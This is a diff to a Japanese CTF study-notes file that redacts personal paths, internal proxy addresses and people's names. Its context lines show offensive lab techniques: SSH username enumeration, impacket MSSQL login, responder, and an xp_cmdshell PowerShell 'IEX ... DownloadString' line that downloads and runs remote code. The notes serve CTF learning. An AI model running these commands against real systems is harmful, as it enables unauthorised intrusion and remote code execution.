@@ -1506,7 +1506,7 @@ USBとの接続記録を抜き出したい場合
 
 別パターン　Leftover Capture Dataの場合
 ```
-PS C:\Program Files\Wireshark> .\tshark.exe -r C:\Users\ryuhta\Desktop\ctf\l.pcap -Y 'usb.capdata' -T fields -e usb.capdata > C:\Users\ryuhta\Desktop\ctf\p.txt
+PS C:\Program Files\Wireshark> .\tshark.exe -r ctf\l.pcap -Y 'usb.capdata' -T fields -e usb.capdata > ctf\p.txt
 ```
 
 切り出した後は形式がUTF-16（BOM）なのでUTF-8にする
@@ -1585,7 +1585,7 @@ Wiresharkで開けない場合はこちらの可能性がある。
 変換ツールが出てる
 https://github.com/microsoft/etl2pcapng
 ```
-> .\etl2pcapng.exe C:\Users\ryuhta\Desktop\tkys_not_enough.pcap pcapng
+> .\etl2pcapng.exe tkys_not_enough.pcap pcapng
 ```
 
 # バイナリ
@@ -1811,7 +1811,7 @@ python3 /home/icuser/tools/ssh-username-enum.py m2.mod4.axof.intra.hckr.jp -p 10
 windows環境からは上手くいかなかったがlinuxからは上手くいった
 kaliにあらかじめ入っていたものは上手く動かなかったので、新しく入れたほうが良い
 ``` bash
-git clone --recurse-submodules https://github.com/SecureAuthCorp/impacket.git -c https.proxy="http://192.168.140.16:60080" 
+git clone --recurse-submodules https://github.com/SecureAuthCorp/impacket.git -c https.proxy="http://proxyIP:port" 
 sudo chmod  +x /home/kali/tools -R
 python3 /home/kali/tools/impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.129.161.170 -windows-auth
 ```
@@ -1827,7 +1827,7 @@ xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://
 
 ### PEASS-ng
 情報列挙用のツール
-git clone --recurse-submodules https://github.com/carlospolop/PEASS-ng.git -c https.proxy="http://192.168.140.16:60080"
+git clone --recurse-submodules https://github.com/carlospolop/PEASS-ng.git -c https.proxy="http://proxyIP:port"
 ただし↑には実行体が含まれていないのでリリースページからダウンロードする必要がある
 
 赤字で書かれたところが重要なところ
@@ -1941,7 +1941,7 @@ sudo responder -I tun0 -A
 MSSQLのクライアントやpsexecなどがある
 ``` bash
 #インストール
-git clone --recurse-submodules https://github.com/SecureAuthCorp/impacket.git -c https.proxy="http://192.168.140.16:60080" 
+git clone --recurse-submodules https://github.com/SecureAuthCorp/impacket.git -c https.proxy="http://proxyIP:port" 
 sudo chmod  +x /home/kali/tools -R
 
 ```
@@ -2014,7 +2014,7 @@ for i in range(100000):
 
 ### サーバと連続でやりとりするPythonスクリプト
 
-大丈夫、齋藤さんのスクリプトだよ
+大丈夫、sさんのスクリプトだよ
 
 ``` python
 import refrom ptrlib
@@ -2063,7 +2063,7 @@ https://github.com/kimwalisch/primecount
 
 参考
 https://nkhrlab.hatenablog.com/entry/2017/10/19/205829
-大丈夫？小林のスクリプトだよ
+大丈夫？kのスクリプトだよ
 
 ``` ruby
 require 'socket'
@@ -2328,7 +2328,7 @@ copy /b a+b+c d.zip
 プロキシを経由させる場合は以下のように
 
 ``` linux 
-nc 3.19.22.162 8001 -x 192.168.100.242:60080 -X connect
+nc 3.19.22.162 8001 -x proxyIP:port -X connect
 ```
 
 ### google Colaboratory
